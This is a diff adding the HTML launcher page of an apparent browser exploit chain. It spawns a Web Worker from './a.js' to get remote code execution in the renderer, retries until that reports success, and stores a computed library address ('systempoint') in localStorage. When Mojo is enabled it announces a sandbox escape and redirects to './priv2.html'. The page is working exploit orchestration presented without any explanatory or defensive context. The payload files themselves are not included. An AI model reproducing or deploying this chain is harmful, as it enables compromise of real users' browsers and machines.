@@ -1,0 +1,66 @@
+<html>
+<h1>trying to get rce in render process,wait...</h1>
+
+<body>
+    <script>
+    function print(...args) {
+        console.log.apply(null, args);
+        if (this.document !== undefined){
+            this.document.write.apply(document, args);
+            this.document.write("<br>");
+        }
+    }
+
+        if (this.Mojo === undefined) {
+            //var blobURL = URL.createObjectURL(new Blob(['(', getConfuseObject.toString(), ')()'], { type: 'application/javascript' }));
+            var url = "./a.js";
+            function startExploit() {
+                document.close();   
+                document.write("<h1>trying to get rce in render</h1>");
+                var worker=[];
+                for(var i=0;i<1;i++){
+                worker[i] = new Worker(url);
+                var finishedWorker = 0;
+                worker[i].onmessage = function (e) {
+
+                    if (e.data === false) {
+                        print(finishedWorker+" exploit result is " + e.data);
+                        finishedWorker++;
+                        if(finishedWorker===worker.length)
+                        setTimeout(() => {
+                            for(var j=0;j<worker.length;j++){
+                                worker[j].terminate();
+                            }
+                            startExploit();
+                        }, 20);
+
+                    } else if(e.data===true){
+
+                        for(var j=0;j<worker.length;j++){
+                                worker[j].terminate();
+                        }
+                        print(finishedWorker+" exploit result is " + e.data);
+                        window.location.reload()
+                    } else if(e.data.log!==undefined){
+                        print.apply(null,e.data.log);
+                    } else{
+                        var libllvmbase = e.data;
+                          localStorage.setItem("systempoint",libllvmbase+0x9ed114);
+
+
+                    }
+                }
+            }
+            }
+            startExploit();
+        } else {
+
+            //document.close();  
+            print("rce succeed and mojo is enabled, begin to escap from sandbox");
+
+            window.location.replace("./priv2.html");
+        }
+    </script>
+</body>
+
+</html>
